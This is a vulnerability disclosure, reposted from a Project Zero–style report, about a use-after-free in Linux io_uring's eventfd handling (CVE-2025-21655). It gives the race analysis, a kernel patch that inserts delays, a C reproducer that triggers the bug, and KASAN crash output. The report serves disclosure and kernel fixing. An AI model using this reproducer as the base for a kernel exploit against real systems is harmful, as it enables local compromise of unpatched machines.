@@ -1,0 +1,334 @@
+id: 39928
+date: 02/22/2025
+title: Linux io_uring Use-After-Free Exploit
+author: Jann Horn
+cves: CVE-2025-21655
+
+Summary
+
+UAF of struct io_ev_fd because io_eventfd_do_signal() frees an object when the refcount reaches zero without waiting for the required grace period.
+
+I haven't sent a patch since I'm not sure what's the best fix for stable.
+Issue description
+
+struct io_ev_fd is supposed to have RCU lifetime: Once its refcount refs has dropped to zero and a subsequent RCU grace period has passed, it can be freed. io_eventfd_grab() relies on this: It uses rcu_read_lock() to protect against ctx->io_ev_fd being freed concurrently. io_eventfd_put() also behaves accordingly: If refs has dropped to zero, it schedules the RCU callback io_eventfd_free, which will free the io_ev_fd after an RCU grace period.
+
+But io_eventfd_do_signal breaks this rule; it does:
+
+        if (refcount_dec_and_test(&ev_fd->refs))
+                io_eventfd_free(rcu);
+
+I suspect this issue was introduced because io_eventfd_do_signal is already an RCU callback, which could make it easy to wrongly assume that no call_rcu() is needed because it is already running in RCU callback context.
+
+The issue makes it possible to race with three userspace threads A, B and C (in a single process) plus RCU work, roughly as follows:
+
+    task A: creates uring instance
+    task A: creates eventfd FD1 and submits POLLIN poll work for it
+    task A: creates pipe (with read end FD2 and write end FD3) and submits POLLIN poll work for FD2
+    task A: creates eventfd FD4 and registers it with IORING_REGISTER_EVENTFD; this creates an ev_fd with refs set to 1.
+    task C: writes into FD1; this wakes the corresponding poll job, which eventually ends up in io_eventfd_signal(), which does io_eventfd_grab(), which increments refs to 2. Since the wakeup came from an eventfd, __io_eventfd_signal() chooses to schedule io_eventfd_do_signal() asynchronously (via RCU); the async work owns the extra reference.
+    task B: writes into FD3; this wakes the poll job for FD2, which eventually ends up in io_eventfd_signal(), which does io_eventfd_grab(). io_eventfd_grab() is interrupted between rcu_dereference(ctx->io_ev_fd) and the expression io_eventfd_trigger(ev_fd) && refcount_inc_not_zero(&ev_fd->refs).
+    task A: unregisters eventfd FD4 from uring instance with IORING_UNREGISTER_EVENTFD; this decrements refs from 2 to 1.
+    RCU work for task C: io_eventfd_do_signal() decrements refs from 1 to 0 and frees the ev_fd with io_eventfd_free().
+    task B: continues execution and hits UAF at the expression io_eventfd_trigger(ev_fd) && refcount_inc_not_zero(&ev_fd->refs).
+
+In other words, there is no RCU delay between ctx->io_ev_fd being set to NULL and the object it pointed to being freed.
+
+This issue was likely introduced in commit
+
+21a091b970cd ("io_uring: signal registered eventfd to process deferred task work").
+
+I think a quick fix would be to use io_eventfd_put() in io_eventfd_do_signal(); but it also doesn't make sense to me that io_eventfd_do_signal() is scheduled as an RCU callback at all, since I don't think the intent is to do work after an RCU grace period, the intent is to break up potential unbounded recursion? This should probably instead be some kind of work item (possibly a "deferred work" item if the intent is to have some amount of delay).
+Testcase
+
+Tested on mainline (at commit 0bc21e701a6ffacfdde7f04f87d664d82e8a13bf).
+
+To reproduce, patch two extra delays into the kernel:
+
+diff --git a/io_uring/eventfd.c b/io_uring/eventfd.c
+index fab936d31ba8..e82d3fcc5093 100644
+--- a/io_uring/eventfd.c
++++ b/io_uring/eventfd.c
+@@ -7,6 +7,7 @@
+ #include <linux/eventpoll.h>
+ #include <linux/io_uring.h>
+ #include <linux/io_uring_types.h>
++#include <linux/delay.h>
+
+ #include "io-wq.h"
+ #include "eventfd.h"
+@@ -39,8 +40,16 @@ static void io_eventfd_do_signal(struct rcu_head *rcu)
+
+        eventfd_signal_mask(ev_fd->cq_ev_fd, EPOLL_URING_WAKE);
+
+-       if (refcount_dec_and_test(&ev_fd->refs))
++       pr_warn("%s(%s): delaying refcount drop: START\n", __func__, current->comm);
++       mdelay(5000);
++       pr_warn("%s(%s): delaying refcount drop: END\n", __func__, current->comm);
++
++       if (refcount_dec_and_test(&ev_fd->refs)) {
++               pr_warn("%s(%s): freeing\n", __func__, current->comm);
+                io_eventfd_free(rcu);
++       } else {
++               pr_warn("%s(%s): NOT FREEING!!!\n", __func__, current->comm);
++       }
+ }
+
+ static void io_eventfd_put(struct io_ev_fd *ev_fd)
+@@ -102,6 +111,13 @@ static struct io_ev_fd *io_eventfd_grab(struct io_ring_ctx *ctx)
+         */
+        ev_fd = rcu_dereference(ctx->io_ev_fd);
+
++       pr_warn("%s(%s) about to grab %px\n", __func__, current->comm, ev_fd);
++       if (strcmp(current->comm, "DELAY-BEFORE") == 0) {
++               pr_warn("%s(%s): start delay\n", __func__, current->comm);
++               mdelay(10000);
++               pr_warn("%s(%s): end delay\n", __func__, current->comm);
++       }
++
+        /*
+         * Check again if ev_fd exists in case an io_eventfd_unregister call
+         * completed between the NULL check of ctx->io_ev_fd at the start of
+
+And run this testcase under that kernel:
+
+#define _GNU_SOURCE
+#include <pthread.h>
+#include <err.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <poll.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <sys/eventfd.h>
+#include <sys/syscall.h>
+#include <linux/io_uring.h>
+
+#define SYSCHK(x) ({          \
+  typeof(x) __res = (x);      \
+  if (__res == (typeof(x))-1) \
+    err(1, "SYSCHK(" #x ")"); \
+  __res;                      \
+})
+
+#define NUM_SQ_PAGES 4
+
+static int uring_fd;
+static int pipe_fds[2];
+static int efd;
+
+static void *pipe_write_fn(void *dummy) {
+  sleep(2);
+  SYSCHK(prctl(PR_SET_NAME, "DELAY-BEFORE"));
+  SYSCHK(write(pipe_fds[1], "a", 1));
+  return NULL;
+}
+static void *efd_write_fn(void *dummy) {
+  SYSCHK(prctl(PR_SET_NAME, "DELAY-AFTER"));
+  SYSCHK(eventfd_write(efd, 1));
+  return NULL;
+}
+
+int main(void) {
+  printf("main pid: %d\n", getpid());
+
+  // sq
+  struct io_uring_sqe *sq_data = SYSCHK(mmap(NULL, NUM_SQ_PAGES*0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0));
+  // cq
+  void *cq_data = SYSCHK(mmap(NULL, NUM_SQ_PAGES*0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0));
+  *(volatile unsigned int *)(cq_data+4) = 64 * NUM_SQ_PAGES;
+
+  // initialize uring
+  struct io_uring_params params = {
+    .flags = IORING_SETUP_DEFER_TASKRUN|IORING_SETUP_SINGLE_ISSUER|IORING_SETUP_NO_MMAP|IORING_SETUP_NO_SQARRAY,
+    .sq_off = { .user_addr = (unsigned long)sq_data },
+    .cq_off = { .user_addr = (unsigned long)cq_data }
+  };
+  uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/10, &params));
+
+  // initialize ev_fd
+  int uring_efd = SYSCHK(eventfd(0, 0));
+  SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_EVENTFD, &uring_efd, 1));
+
+  // add poll watches for two fds (one eventfd, one pipe read fd)
+  SYSCHK(pipe(pipe_fds));
+  efd = SYSCHK(eventfd(0, 0));
+  printf("pipe = {read:%d,write:%d};   efd=%d\n", pipe_fds[0], pipe_fds[1], efd);
+  sq_data[0] = (struct io_uring_sqe) {
+    .opcode = IORING_OP_POLL_ADD,
+    .flags = 0,
+    .ioprio = 0,
+    .fd = pipe_fds[0],
+    .poll_events = POLLIN,
+    .user_data = 123
+  };
+  sq_data[1] = (struct io_uring_sqe) {
+    .opcode = IORING_OP_POLL_ADD,
+    .flags = 0,
+    .ioprio = 0,
+    .fd = efd,
+    .poll_events = POLLIN,
+    .user_data = 456
+  };
+
+  int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd,
+                                 /*to_submit=*/1, /*min_complete=*/0,
+                                 /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0));
+  printf("submitted %d\n", submitted);
+  submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd,
+                                 /*to_submit=*/1, /*min_complete=*/0,
+                                 /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0));
+  printf("submitted %d\n", submitted);
+
+  // create racing threads
+  pthread_t pipe_write_thread, efd_write_thread;
+  if (pthread_create(&pipe_write_thread, NULL, pipe_write_fn, NULL))
+    errx(1, "pthread_create");
+  if (pthread_create(&efd_write_thread, NULL, efd_write_fn, NULL))
+    errx(1, "pthread_create");
+
+  sleep(1);
+  SYSCHK(syscall(__NR_io_uring_enter, uring_fd, 0, 1, IORING_ENTER_GETEVENTS));
+
+  sleep(2);
+
+  // unregister eventfd, dropping ev_fd refcount 2->1
+  SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_UNREGISTER_EVENTFD, NULL, 0));
+
+  // wait for threads
+  pthread_join(pipe_write_thread, NULL);
+  pthread_join(efd_write_thread, NULL);
+
+  return 0;
+}
+
+I tested with KCFLAGS=-fno-optimize-sibling-calls; without that, the stack traces can look more confusing because tail call optimization can make it seem like rcu_core() is directly calling kfree().
+
+I tested with CONFIG_NR_CPUS=4 and CONFIG_RCU_STRICT_GRACE_PERIOD=y; without that, the testcase may or may not trigger depending on how the timing works out.
+
+Output:
+
+[ 60.357869][ T1088] io_eventfd_grab(DELAY-AFTER) about to grab ffff888146a76400
+[ 60.363155][    C0] io_eventfd_do_signal(kworker/u16:1): delaying refcount drop: START
+[ 61.349104][ T1086] io_eventfd_grab(uring-ev_fd-uaf) about to grab ffff888146a76400
+[ 62.341134][ T1087] io_eventfd_grab(DELAY-BEFORE) about to grab ffff888146a76400
+[ 62.344337][ T1087] io_eventfd_grab(DELAY-BEFORE): start delay
+[    C0] io_eventfd_do_signal(kworker/u16:1): delaying refcount drop: END
+[ 65.372182][    C0] io_eventfd_do_signal(kworker/u16:1): freeing
+[ 65.373205][    C0] clocksource: Long readout interval, skipping watchdog check: cs_nsec: 3897392048 wd_nsec: 3897390488
+[ 72.346929][ T1087] io_eventfd_grab(DELAY-BEFORE): end delay
+[ 72.352624][ T1087] ==================================================================
+[ 72.353775][ T1087] BUG: KASAN: slab-use-after-free in io_eventfd_grab (io_uring/eventfd.c:91 io_uring/eventfd.c:126)
+[ 72.354882][ T1087] Read of size 4 at addr ffff888146a76408 by task DELAY-BEFORE/1087
+[ 72.356012][ T1087]
+[ 72.356350][ T1087] CPU: 1 UID: 1000 PID: 1087 Comm: DELAY-BEFORE Not tainted 6.13.0-rc5-00012-g0bc21e701a6f-dirty #612
+[ 72.357893][ T1087] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[ 72.359365][ T1087] Call Trace:
+[ 72.359840][ T1087]  <TASK>
+[ 72.360263][ T1087] dump_stack_lvl (lib/dump_stack.c:122)
+[ 72.360910][ T1087] print_report (mm/kasan/report.c:379 mm/kasan/report.c:489)
+[ 72.363006][ T1087] kasan_report (mm/kasan/report.c:221 mm/kasan/report.c:604)
+[ 72.370432][ T1087] __asan_report_load4_noabort (mm/kasan/report_generic.c:380)
+[ 72.371249][ T1087] io_eventfd_grab (io_uring/eventfd.c:91 io_uring/eventfd.c:126)
+[ 72.375555][ T1087] io_eventfd_signal (io_uring/eventfd.c:138)
+[ 72.376226][ T1087] io_req_local_work_add (io_uring/io_uring.c:1202)
+[ 72.380651][ T1087] __io_req_task_work_add (io_uring/io_uring.c:1248)
+[ 72.387799][ T1087] __io_poll_execute (io_uring/poll.c:205)
+[ 72.388507][ T1087] io_poll_wake (io_uring/poll.c:397)
+[ 72.390567][ T1087] __wake_up_common (kernel/sched/wait.c:90)
+[ 72.391267][ T1087] __wake_up_sync_key (./include/linux/spinlock.h:406 kernel/sched/wait.c:108 kernel/sched/wait.c:173)
+[ 72.391965][ T1087] pipe_write (fs/pipe.c:603)
+[ 72.403194][ T1087] vfs_write (fs/read_write.c:587 (discriminator 1) fs/read_write.c:679 (discriminator 1))
+[ 72.411104][ T1087] ksys_write (fs/read_write.c:731)
+[ 72.413931][ T1087] __x64_sys_write (fs/read_write.c:739)
+[ 72.419144][ T1087] x64_sys_call (./arch/x86/include/generated/asm/syscalls_64.h:2)
+[ 72.419813][ T1087] do_syscall_64 (arch/x86/entry/common.c:52 (discriminator 1) arch/x86/entry/common.c:83 (discriminator 1))
+[ 72.420452][ T1087] entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+[...]
+[ 72.436210][ T1087]  </TASK>
+[ 72.436648][ T1087]
+[ 72.436985][ T1087] Allocated by task 1086 on cpu 2 at 60.354865s:
+[ 72.437894][ T1087] kasan_save_stack (mm/kasan/common.c:48)
+[ 72.438571][ T1087] kasan_save_track (mm/kasan/common.c:54 (discriminator 4) mm/kasan/common.c:69 (discriminator 4))
+[ 72.439242][ T1087] kasan_save_alloc_info (mm/kasan/generic.c:569)
+[ 72.439976][ T1087] __kasan_kmalloc (mm/kasan/common.c:377 mm/kasan/common.c:394)
+[ 72.440635][ T1087] __kmalloc_cache_noprof (mm/slub.c:4331)
+[ 72.441417][ T1087] io_eventfd_register (./include/linux/slab.h:901 io_uring/eventfd.c:186)
+[ 72.442141][ T1087] __io_uring_register (io_uring/register.c:676)
+[ 72.442885][ T1087] __x64_sys_io_uring_register (io_uring/register.c:912 io_uring/register.c:887 io_uring/register.c:887)
+[ 72.443718][ T1087] x64_sys_call (./arch/x86/include/generated/asm/syscalls_64.h:428)
+[ 72.444386][ T1087] do_syscall_64 (arch/x86/entry/common.c:52 (discriminator 1) arch/x86/entry/common.c:83 (discriminator 1))
+[ 72.445026][ T1087] entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+[ 72.445875][ T1087]
+[ 72.446212][ T1087] Freed by task 12 on cpu 0 at 65.373089s:
+[ 72.447055][ T1087] kasan_save_stack (mm/kasan/common.c:48)
+[ 72.447728][ T1087] kasan_save_track (mm/kasan/common.c:54 (discriminator 4) mm/kasan/common.c:69 (discriminator 4))
+[ 72.452789][ T1087] kasan_save_free_info (mm/kasan/generic.c:585 (discriminator 1))
+[ 72.453516][ T1087] __kasan_slab_free (mm/kasan/common.c:271)
+[ 72.454203][ T1087] kfree (mm/slub.c:4613 (discriminator 3) mm/slub.c:4761 (discriminator 3))
+[ 72.454773][ T1087] io_eventfd_free (io_uring/eventfd.c:35)
+[ 72.455432][ T1087] io_eventfd_do_signal.cold (io_uring/eventfd.c:53)
+[ 72.456223][ T1087] rcu_core (./include/linux/rcupdate.h:347 (discriminator 1) kernel/rcu/tree.c:2569 (discriminator 1) kernel/rcu/tree.c:2823 (discriminator 1))
+[ 72.456835][ T1087] rcu_core_si (kernel/rcu/tree.c:2841)
+[ 72.457434][ T1087] handle_softirqs (./arch/x86/include/asm/jump_label.h:36 ./include/trace/events/irq.h:142 kernel/softirq.c:562)
+[ 72.458122][ T1087] irq_exit_rcu (kernel/softirq.c:596 kernel/softirq.c:435 kernel/softirq.c:662 kernel/softirq.c:678)
+[ 72.458749][ T1087] sysvec_call_function (arch/x86/kernel/smp.c:257 (discriminator 35) arch/x86/kernel/smp.c:257 (discriminator 35))
+[ 72.459479][ T1087] asm_sysvec_call_function (./arch/x86/include/asm/idtentry.h:710)
+[ 72.460251][ T1087]
+[ 72.460591][ T1087] Last potentially related work creation:
+[ 72.461407][ T1087] kasan_save_stack (mm/kasan/common.c:48)
+[ 72.462087][ T1087] __kasan_record_aux_stack (mm/kasan/generic.c:544 (discriminator 1))
+[ 72.462865][ T1087] kasan_record_aux_stack_noalloc (mm/kasan/generic.c:555)
+[ 72.463696][ T1087] __call_rcu_common.constprop.0 (./arch/x86/include/asm/irqflags.h:26 ./arch/x86/include/asm/irqflags.h:87 ./arch/x86/include/asm/irqflags.h:123 kernel/rcu/tree.c:3087)
+[ 72.464552][ T1087] call_rcu (kernel/rcu/tree.c:3191)
+[ 72.469274][ T1087] __io_eventfd_signal (io_uring/eventfd.c:82)
+[ 72.469998][ T1087] io_eventfd_signal (io_uring/eventfd.c:63 io_uring/eventfd.c:139)
+[ 72.470684][ T1087] io_req_local_work_add (io_uring/io_uring.c:1202)
+[ 72.471444][ T1087] __io_req_task_work_add (io_uring/io_uring.c:1248)
+[ 72.472207][ T1087] __io_poll_execute (io_uring/poll.c:205)
+[ 72.472916][ T1087] io_poll_wake (io_uring/poll.c:397)
+[ 72.473564][ T1087] __wake_up_common (kernel/sched/wait.c:90)
+[ 72.474262][ T1087] __wake_up_locked_key (kernel/sched/wait.c:148)
+[ 72.474991][ T1087] eventfd_write (fs/eventfd.c:275 (discriminator 1))
+[ 72.475649][ T1087] vfs_write (fs/read_write.c:677)
+[ 72.476267][ T1087] ksys_write (fs/read_write.c:731)
+[ 72.476877][ T1087] __x64_sys_write (fs/read_write.c:739)
+[ 72.477539][ T1087] x64_sys_call (./arch/x86/include/generated/asm/syscalls_64.h:2)
+[ 72.478201][ T1087] do_syscall_64 (arch/x86/entry/common.c:52 (discriminator 1) arch/x86/entry/common.c:83 (discriminator 1))
+[ 72.478847][ T1087] entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+[ 72.479696][ T1087]
+[ 72.480036][ T1087] The buggy address belongs to the object at ffff888146a76400
+[ 72.480036][ T1087]  which belongs to the cache kmalloc-64 of size 64
+[ 72.486103][ T1087] The buggy address is located 8 bytes inside of
+[ 72.486103][ T1087]  freed 64-byte region [ffff888146a76400, ffff888146a76440)
+[ 72.488032][ T1087]
+[ 72.488370][ T1087] The buggy address belongs to the physical page:
+[ 72.489284][ T1087] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0xffff888146a76580 pfn:0x146a76
+[ 72.490727][ T1087] flags: 0x600000000000200(workingset|node=1|zone=2)
+[ 72.491690][ T1087] page_type: f5(slab)
+[ 72.492264][ T1087] raw: 0600000000000200 ffff8880090428c0 ffffea0005000250 ffffea00051aba10
+[ 72.493491][ T1087] raw: ffff888146a76580 000000000020000b 00000001f5000000 0000000000000000
+[ 72.494721][ T1087] page dumped because: kasan: bad access detected
+[ 72.495640][ T1087]
+[ 72.495981][ T1087] Memory state around the buggy address:
+[ 72.496783][ T1087]  ffff888146a76300: 00 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc
+[ 72.497941][ T1087]  ffff888146a76380: fa fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
+[ 72.503192][ T1087] >ffff888146a76400: fa fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
+[ 72.504343][ T1087]                       ^
+[ 72.504961][ T1087]  ffff888146a76480: fa fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
+[ 72.506105][ T1087]  ffff888146a76500: fa fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
+[ 72.507265][ T1087] ==================================================================
+
+Disclosure deadline
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2025-04-08.
+
+For more details, see the Project Zero vulnerability disclosure policy: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html
+
+Related CVE Number: CVE-2025-21655.
+
+Credit: Jann Horn
+
+#  0day.today [2025-02-24]  #
